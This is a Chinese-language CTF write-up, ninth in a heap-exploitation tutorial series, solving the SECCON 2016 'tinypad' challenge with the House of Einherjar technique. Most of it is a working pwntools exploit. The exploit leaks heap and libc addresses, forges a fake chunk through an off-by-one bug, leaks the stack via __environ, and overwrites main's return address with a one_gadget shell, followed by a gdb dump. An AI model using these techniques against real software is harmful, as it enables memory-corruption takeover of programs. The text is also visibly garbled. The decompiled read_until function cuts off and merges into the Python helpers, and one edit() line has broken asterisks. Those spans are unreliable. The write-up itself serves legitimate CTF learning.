# pwn堆入门系列教程9
[pwn堆入门系列教程1](https://xz.aliyun.com/t/6087)  
[pwn堆入门系列教程2](https://xz.aliyun.com/t/6169)  
[pwn堆入门系列教程3](https://xz.aliyun.com/t/6252)  
[pwn堆入门系列教程4](https://xz.aliyun.com/t/6322)  
[pwn堆入门系列教程5](https://xz.aliyun.com/t/6377)  
[pwn堆入门系列教程6](https://xz.aliyun.com/t/6406)  
[pwn堆入门系列教程7](https://xz.aliyun.com/t/6449)  
[pwn堆入门系列教程8](https://xz.aliyun.com/t/6473)
学习House Of Einherjar
## 2016 Seccon tinypad
这道题说难不难。。我也做得久了，因为exp看不懂啊，这么复杂。。。后来简化了下，感觉轻松点了
功能分析，新增，删除，编辑，退出
至于洞，off-by-one
    unsigned __int64 __fastcall read_until(char *a1, unsigned __int64 len, unsigned int terminate)
    {
      int v4; // [rsp+Ch] [rbp-34h]
      unsigned __int64 i; // [rsp+28h] [rbp-18h]
      __int64 v6; // [rsp+30h] [rbp-10h]
      v4 = terminate;
      for ( i = 0LL; i >> ", idx)
    def add(size, content):
        choice("A")
        io.sendlineafter("(SIZE)>>> ", str(size))
        io.sendlineafter("(CONTENT)>>> ", content)
    def remove(idx):
        choice("D")
        io.sendlineafter("(INDEX)>>> ", str(idx))
    def edit(idx, content):
        choice("E")
        io.sendlineafter("(INDEX)>>> ", str(idx))
        io.sendlineafter("(CONTENT)>>> ", content)
        io.sendlineafter("(Y/n)>>> ", "Y")
    def quit():
        choice("Q")
#### 泄露地址
    #stage 1 leak the addr
        add(0x80, '1'*0x80)
        add(0x80, '2'*0x80)
        add(0x80, '3'*0x80)
        add(0x80, '4'*0x80)
        remove(3)
        remove(1)
        io.recvuntil("INDEX: 1\n")
        io.recvuntil(" # CONTENT: ")
        heap = u64(io.recvline().rstrip().ljust(8, '\x00')) - 0x120
        io.success("heap: 0x%x" % heap)
        io.recvuntil("INDEX: 3\n")
        io.recvuntil(" # CONTENT: ")
        leak_libc = u64(io.recvline().strip().ljust(8, '\x00')) - 88
        io.success("main_arena: 0x%x" %leak_libc)
        libc_base = leak_libc - 0x3c4b20
        remove(2)
        remove(4)
这个部分简单啊，leak，全在unsortedbin里，这里学到一个知识点是rstrip,通常我只用过strip，  
该rstrip()方法删除所有尾随字符（字符串末尾的字符），空格是要删除的默认尾随字符  
至于88这个是main_arena+88，减掉就是main_arena
#### House Of Einherjar
    add(0x10, '1'*0x10)
        add(0x100, '2'*0xf8 + p64(0x11))
        add(0x100, '3'*0xf8)
        add(0x100, '4'*0xf8)
        tinypad = 0x0000000000602040
        offset = heap + 0x20 - (0x602040 + 0x20)
        io.success("offset: 0x%x" % offset)
        fake_chunk = p64(0) + p64(0x101) + p64(0x602060)*2
        edit(3, "4"*0x20 + fake_chunk)
        remove(1)
        add(0x18, '1'*0x10 + p64(offset))
        remove(2)
        #gdb.attach(io)
        edit(4, "4"*0x20 + p64(0) + p64(0x101) + p64(leak_libc + 88)*2)
原解我感觉把题目搞复杂了，不需要for循环覆盖那个pre_size，完全可以利用add的时候加上就完了，  
house of einherjar这个攻击方法有点类似于unlink，不过又不太相似
  1. 目标:0x602060这个位置  
heap + 0x20是第二个chunk位置  
我们目的就是让第二个chunk的上一个chunk达到0x602060  
所以pre_size就是第二个chunk位置减去0x602060  
offset = heap + 0x20 - (0x602040 + 0x20)
  2. fake_chunk这里是从tinypad开始地址开始覆盖的，前面0x20个作为后面填充部分，防止多次写的时候复盖到  
然后指针不像unlink那样了，  
p->fd = p  
p->bk = p
  3. 这里edit的时候都会从tinypad开始覆盖，所以编辑别个也可以的  
edit(3, "4"*0x20 + fake_chunk)
  4. remove(1)在add(0x18)，利用tcache的复用就行了，原exp的解是搞得很复杂，循环单字节null填充，太麻烦了感觉
  5. 这点不用这么复杂，0x101是为了后面分配用的，而p64(leak_libc+88)*2 这里，你只要bk是个可写的地址就行了，不要是不可写的就行，unsortedbin攻击里讲过
引用ctf-wiki
    #在 glibc/malloc/malloc.c 中的 _int_malloc 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 bck->fd 的位置写入本 Unsorted Bin 的位置。
              /* remove from unsorted list */
              if (__glibc_unlikely (bck->fd != victim))
                malloc_printerr ("malloc(): corrupted unsorted chunks 3");
              unsorted_chunks (av)->bk = bck;
              bck->fd = unsorted_chunks (av);
edit(4, "4" _0x20 + p64(0) + p64(0x101) + p64(leak_libc + 88)_ 2)
#### getshell
    #stage 3
        one_gadget = libc_base + 0x45216
        io.success("libc_base: 0x%x" % libc_base)
        environ_pointer = libc_base + libc.symbols['__environ']
        io.success("environ_pointer: 0x%x" % environ_pointer)
        add(0xf0, '1'*0xd0 + p64(0x18) + p64(environ_pointer) + 'a'*8 + p64(0x602148))
        io.recvuntil(" #   INDEX: 1\n")
        io.recvuntil(" # CONTENT: ")
        main_ret = u64(io.recvline().rstrip().ljust(8, '\x00')) - 0x8 * 30
        io.success("main_ret: %x" % main_ret)
        edit(2, p64(main_ret))
        edit(1, p64(one_gadget))
        quit()
这里学到了一个新方法，通过environ泄露main函数ret地址，然后覆盖main_ret
在 Linux 系统中，glibc 的环境指针 environ(environment pointer)
为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，可通过
environ 指针泄露栈地址。  
[讲解这部分的文章](http://0x4c43.cn/2018/1013/stack-overflow-smash-utilization/)
这里还用到个常用攻击方法，覆盖两个指针，一个用来控制另一个地址的，这个跟unlink那会学的攻击手法一样的，至于0x8*30,可以用查看内存中对比
自己调试的时候可以main函数尾部下个断，可以看到我这个结果
    Breakpoint 1, 0x0000000000400e68 in main ()
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    ────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────
     RAX  0x0
     RBX  0x0
     RCX  0x0
     RDX  0x7f5fc76f6ae0 (_nl_C_LC_CTYPE_toupper) ◂— add    byte ptr [rax], 0
     RDI  0x51
     RSI  0x0
     R8   0x1
     R9   0x1999999999999999
     R10  0x0
     R11  0x246
     R12  0x4006e0 (_start) ◂— xor    ebp, ebp
     R13  0x7fff53d21f40 ◂— 0x1
     R14  0x0
     R15  0x0
     RBP  0x401370 (__libc_csu_init) ◂— push   r15
     RSP  0x7fff53d21e68 —▸ 0x7f5fc75a0830 (__libc_start_main+240) ◂— mov    edi, eax
     RIP  0x400e68 (main+1541) ◂— ret    
    ──────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────
     ► 0x400e68                       ret             
        ↓
       0x7f5fc75a0830     mov    edi, eax